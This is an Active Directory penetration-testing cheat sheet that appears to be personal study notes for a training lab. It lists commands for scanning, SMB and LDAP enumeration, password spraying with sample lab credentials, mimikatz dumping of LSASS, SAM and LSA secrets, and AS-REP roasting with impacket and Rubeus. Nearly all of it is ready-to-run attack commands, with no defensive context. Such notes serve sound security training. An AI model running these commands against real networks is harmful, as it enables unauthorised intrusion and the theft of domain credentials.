# AD-Onepage

#External
Scanning all accessible targets externally
```
nmap -A -p- -Pn <ip> -oN nmap-name.txt
```

Check what systems user can login to (pwn3d = local admin)
```
crackmapexec smb 192.168.50.75 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
```

SMB
```
crackmapexec smb 192.168.50.75 -u pete -p 'Nexus123!' -d corp.com  ---shares
crackmapexec smb 192.168.50.75 -u pete -p 'Nexus123!' --shares
Nxc smb <ip> -u '' ip ''
```

LDAP
//try null (no user/password) [//wiki](https://www.netexec.wiki/ldap-protocol/query-ldap)
```
Nxc ldap <ip> -u '' ip '' 
Nxc ldap <ip> -u '' ip '' -M get-desc-users
Ldapsearch -x -H ldap://<DC IP>:389 -b"DC=<>,DC=<>" |grep -I 'password'
Nxc ldap <dc> -u users.txt -p <password> --continue-on-success
```
#Internal
**Credential dumps
mimikatz - elevate privilidges
```
privilege::debug
token::elevate
```
then try dump credentials
```
sekurlsa::logonpasswords //lsass
lsadump::sam
lsadump::lsa
lsadump::cache
lsadump::secrets
```

AS-Rep Roasting

from kali
```
impacket-GetNPUsers -no-pass -usersfile unames.txt EGOTISTICAL-BANK.LOCAL/
```
on Windows
```
./Rubeus.exe asreproast![image](https://github.com/user-attachments/assets/d5af009d-339e-40b4-a216-4b271a3c396b)

```
